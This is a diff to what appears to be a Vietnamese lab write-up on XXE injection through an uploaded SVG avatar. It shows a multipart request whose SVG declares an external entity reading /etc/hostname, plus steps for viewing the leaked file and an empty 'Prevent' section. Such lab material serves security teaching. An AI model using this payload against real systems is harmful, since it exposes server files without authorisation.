@@ -151,19 +151,15 @@ Content-Disposition: form-data; name="name"
 a
 ------WebKitFormBoundaryjBtoTJseBoFRQecm
 Content-Disposition: form-data; name="avatar"; filename="a.svg"
-Content-Type: text/xml
+Content-Type: image/svg+xml
 
-<?xml version="1.0" standalone="no"?>
-<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
-  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" [
-  <!ENTITY xxe SYSTEM "file:///etc/hostname">
+<?xml version="1.0"?>
+<!DOCTYPE test [ 
+    <!ENTITY xxe SYSTEM "file:///etc/hostname" > 
 ]>
-<svg width="200" height="200"
-     xmlns="http://www.w3.org/2000/svg"
-     xmlns:xlink="http://www.w3.org/1999/xlink">
-  <text x="10" y="20">&xxe;</text>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+	<text font-size="16" x="0" y="16">&xxe;</text>
 </svg>
-
 ------WebKitFormBoundaryjBtoTJseBoFRQecm
 Content-Disposition: form-data; name="email"
 
@@ -181,6 +177,9 @@ http://a.com
 - Gửi lại request và mở file **/post/comment/avatars?filename=1.png** trong tab mới
 - Nội dung hiển thị trong ảnh là nội dung của `/etc/hostname`
 - Submit solution
+
+## Prevent
+--- 
 
 
 ---
